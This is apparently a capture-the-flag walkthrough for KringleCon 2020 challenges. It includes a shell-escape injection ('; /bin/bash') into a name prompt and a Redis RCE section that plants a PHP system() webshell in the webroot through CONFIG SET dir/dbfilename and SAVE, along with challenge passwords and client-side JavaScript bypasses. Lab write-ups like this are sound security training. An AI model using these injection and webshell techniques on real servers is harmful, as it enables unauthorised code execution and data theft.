# Kringlecon2020

## Challenges

### Uncover Santa's Gift List

Talk to JingleRingford and he points you in the direction of the Billboard and recommends Photopea and something called Lasso...

Also mentions Filtering Distortion

### Terminal Injection

Option 4, then `; /bin/bash` 

```
Enter choice [1 - 5] 4
Enter your name (Please avoid special characters, they cause some weird errors)...; /bin/bash
 _______________________
< Santa's Little Helper >
 -----------------------
  \
   \   \_\_    _/_/
    \      \__/
           (oo)\_______
           (__)\       )\/\
               ||----w |
               ||     ||

   ___                                                      _    
  / __|   _  _     __      __      ___     ___     ___     | |   
  \__ \  | +| |   / _|    / _|    / -_)   (_-<    (_-<     |_|   
  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_| """ | 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
```


### Investigate S3 Bucket

1/5 Difficulty

When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.

/etc/motd included a reference to Wrapper3000

```
Can you help me? Santa has been experimenting with new wrapping technology, and
we've run into a ribbon-curling nightmare!
We store our essential data assets in the cloud, and what a joy it's been!
Except I don't remember where, and the Wrapper3000 is on the fritz!

Can you find the missing package, and unwrap it all the way?

Hints: Use the file command to identify a file type. You can also examine
tool help using the man command. Search all man pages for a string such as
a file extension using the apropos command.

To see this help again, run cat /etc/motd.
```

wrapper3000 was a valid bucket!

./bucketfinder.rb wordlist

package contents look like... 

```
UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA
```


Running that through cyberchef using b64 decode and then unzip gives us

```package.txt.Z.xz.xxd.tar.bz2```
package.txt.Z.xz.xxd.tar.bz2

So we download the file

```
base64 -d package > test.zip
```

then 

```
unzip test.zip
```

then unzip via 7zip

Now we have an xxd file, which is a linux HexDump so lets see what the manpages have to say

https://www.tutorialspoint.com/unix_commands/xxd.htm


Hmm so lets try and revert this thing

`xxd -r package.txt.Z.xz.xxd > package.txt.Z.xz`

WinRAR should take care of the rest!

```
cat package.txt
North Pole: The Frostiest Place on Earth
```

### Terminal escape

tmux is pretty easy,  I actually knew this one right away

```
tmux list sessions
```
Shows there is one session, session 0 so lets attach!

```
tmux attach-session -t 0
```

Done!

### Courtyard Linux

Again more generic linux commands to work on! Not worth posting here since theyre all pretty basic

### Point of Sale Recovery

So the objective here is extracting an ASAR from a binary

First, download the EXE 

Next we will use the npn ASAR package, this gives us a quick explanation of what the ASAR is 


```
Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support.

```
After banging my head against a wall for a while, I ran `file` on the exe it gives you which ends up being an NSIS which can be extracted using 7Zip

Then we can extract it, head over to the asar file, and follow this tutorial
https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37

`santapass` :)

### 33.6kbps

Same idea as the Santavator, though I will admit I spent a few minutes trying to figure out how to do the dumb phone sound thing. If we didn't want to try and hack this one, the objective is to dial a phone number on the fake phone and then play a series of sounds to imitate a dial-up handshake sequene. The main problem is the sounds are out of order and you have to punch them in, not only in the correct order but also in the given timeframe. That sucks, lets see if we can find an easier way in.

The idea here is that again we have a challenge that presents all the means to beating it on the client side, we just need to dive into the code to find out. Click on the phone and then open the sources tab and you will see a JS file at https://dialup.kringlecastle.com/dialup.js has the source code for this challenge. As we take a look at the source code, there is what appears to be a large block of code approx midway down (starting at line 130) that evaluates a conditional, and then appends a fragment of a string to the `secret` var. For example

```
if (phase === 3) {
    phase = 4;
    playPhase();
    secret += '3j2jc'
  } else {
    phase = 0;
    playPhase();
```

Hmm so if `phase` is at 3, we increment `phase` and then add to the `secret` var. My guess is that `phase` is used to track how many correct sequences of sounds a player has input. As we scroll down more, we see more of the above style if/else blocks that continue to build out the `secret` string. The last phase appears to be 8, and the final if/else looks like 
```
trn.addEventListener('click', () => {
  if (phase === 7) {
    phase = 8;
    secret += 'djjzz'
    playPhase();
  } else {
    phase = 0;
    playPhase();
  }
  sfx.trn.play();
});
```

Putting together all the fragments of `secret` it seems the value is set to `secret = '39cajd3j2jc329dz4hhddhbvan3djjzz';` upon successful completion of the challenge, and the value of `phase` will be 8. Scrolling down further, on line 194 we see a `switch` statement which indeed begins to evaluate the value of `phase`. If we scroll down to the case for if `phase` equals 8 we can see the following:
```
case 8:
      timeouts.push(setTimeout(() => {
        sfx.updated.play();
        timeouts.push(setTimeout(() => {
          phase = 0;
          playPhase();
        }, 3500));
        $.get("checkpass.php?i=" + secret + "&resourceId=" + resourceId, function( data ) {
          try {
            var result = JSON.parse(data);
            if (result.success) {
              __POST_RESULTS__({
                hash: result.hash,
                resourceId: result.resourceId,
              });
            }
          } catch (err) {
            console.log('error:', err);
          }
        });
      }, 5000));
      break;
```
Ah ok! So now we have everything we need! We need to pause execution <b>right before</b> the switch is evaluated, and set `secret` to '39cajd3j2jc329dz4hhddhbvan3djjzz' and `phase` to 8. Setting a breakpoint on line 194 we then click on the phone, execution pauses, we can then navigate to the console and paste in the following lines:
```
secret = '39cajd3j2jc329dz4hhddhbvan3djjzz';
phase = 8;
```

Resume execution of the script and you should hear a neat voiceover saying the lights have been updated, as well as be presented with a notification that the challenge is complete!

## Redis RCE

Difficulty - 

There is a terminal in the kitchen running a web app that has a Redis DB on the backend, it is assumed vulnerable to RCE!

Lets take a look here...

The terminal reports 

```
We need your help!!
The server stopped working, all that's left is the maintenance port.
To access it, run:
curl http://localhost/maintenance.php
We're pretty sure the bug is in the index page. Can you somehow use the
maintenance page to view the source code for the index page?
```

And the hint we are provided points at this article

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

```
curl http://localhost/maintenance.php
ERROR: 'cmd' argument required (use commas to separate commands); eg:
curl http://localhost/maintenance.php?cmd=help
curl http://localhost/maintenance.php?cmd=mget,example1
```

```
curl http://localhost/maintenance.php?cmd=whoami
Running: redis-cli --raw -a '<password censored>' 'whoami'
ERR unknown command `whoami`, with args beginning with: 
```

Ah ok so the cmd param is being inserted into a redis-cli command! 

```
curl http://localhost/maintenance.php?cmd=info  
Running: redis-cli --raw -a '<password censored>' 'info'
# Server
redis_version:5.0.3
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:1b271fe49834c463
redis_mode:standalone
os:Linux 4.19.0-13-cloud-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:6
run_id:34216f4fe22c45b2833c2b23cfefe6fc96801f52
tcp_port:6379
uptime_in_seconds:140
uptime_in_days:0
hz:10
configured_hz:10
...
```

Boom ok so we are getting somewhere!

Well lets try and actually connect 

```
redis-cli -h localhost
```

That works!

But it looks like we need auth, lets see if we can find the config file anywhere

The info command from above shows the config file is found at /usr/local/etc/redis/redis.conf lets try cat-ing that file

Hmm, permissions denied. Well, lets try setting temp creds through the web commands!

`curl http://localhost/maintenance.php?cmd=config+set+requirepass+pass`

No permissions, and no tools such as nmap or msf to bruteforce so it must be the cmd param that we have to do all of this from.

```
player@9a2f1c267db8:~$ curl http://localhost/maintenance.php?cmd=help
Running: redis-cli --raw -a '<password censored>' 'help'
redis-cli 5.0.3
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit
To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
```

So the elf in the kitchen mentioned something about commas, looks like instead of using plusses or %20 which are the URL encoded characters for whitespace, we want to use commas!

```
curl http://localhost/maintenance.php?cmd=CONFIG,GET,*
Running: redis-cli --raw -a '<password censored>' 'CONFIG' 'GET' '*'
dbfilename
dump.rdb
requirepass
R3disp@ss
masterauth
cluster-announce-ip
unixsocket
logfile
pidfile
/var/run/redis_6379.pid
slave-announce-ip
replica-announce-ip
maxmemory
0
proto-max-bulk-len
536870912
client-query-buffer-limit
1073741824
...
```
This looks interesting, lets connect to the server and try authing

```
redis-cli -h localhost

> AUTH R3disp@ss
OK
```

Boom we are in! Ok now to get index.php...
<?php system('cat index.php');?> 

So `config get *` shows that `dir` is set to `/` which we can change, it also shows that the dbfilename, which is dump.rdb. The hint provides us another clue with what we want to do...

```
Redis RCE
Webshell
From: http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html
You must know the path of the Web site folder:
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
​If the webshell access exception, you can empty the database after backup and try again, remember to restore the database.
```

So if we can set the dir to the webroot, and then anything we put in dbfilename is hosted there, lets try setting the dbfilename to something like emerson.php and the dir to /var/www/html which is where index.php resides. Lastly we need to find a way to cat index.php, that can be accomplished by triggering this php code snippet that will be in emerson.php `<?php system('cat index.php');?>`

So while authed to redis:
```
localhost:6379> config set dir /var/www/html
OK
localhost:6379> config set dbfilename emerson.php
OK
localhost:6379> set emerson "<?php system('cat index.php');?>"
OK
localhost:6379> save
OK

```

Now lets go for the kill!
```
layer@685d44f504ac:~$ curl http://localhost/emerson.php --output -
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�NI�_used-mem ?
 aof-preamble��� foobar  emerson <?php
# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
# 
echo "Something is wrong with this page! Please use http://localhost/maintenance.php to se
e if you can figure out what's going on"
?>
/var/www/htmexample1The site is in maintenance modeexample2#We think there's a bug in inde
x.php
dbfilename
          emerson.php����4 �player@685d44f504ac:~$ 

```

## Operate the SantaVator!

This one is a classic example of client side security. If we click on the panel on the wall and open up the developer tools of the browser and browse to `app.js` we can dig around and see that there is an array called `tokens` which is created by parsing the token set in local storage that contains all of the current items in the player's inventory. If we set a breakpoint before the contents of this array are verified, for example line 262, we can allow the JS to execute up to that line, then navigate to the console and type the following 3 commands to spawn the lights. Repeat with other items as necessary
```
tokens.push("greenlight");
tokens.push("redlight");
tokens.push("yellowlight");
tokens.push("workshop-button");
```
Which are the 4 items needed for a powered elevator and the workshop, I am not gonna say how I got this one explicitly, its worth digging through the source code to find this one. 

Boom we've got it! (Note I picked up the 2 knuts and candycane on my own but just got sick of looking for the lights lol)

Note: If you dont eventually gather all the items, you will have to repeat these commands every time you want to power on the elevator.

## HID Box 

## Password in Binary

This is pretty easy! Bushy Evergreen needs a password from a binary and mentions "human readable strings" so lets try the `strings` and just a little grep

```
elf@39e34b976723 ~/lab $ strings door | grep -i password 
/home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There's gotta be a
Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
Beep boop invalid password
```

```
./door
What do you enter? > Op3nTheD00r
Checking......
Door opened!
```

Nice

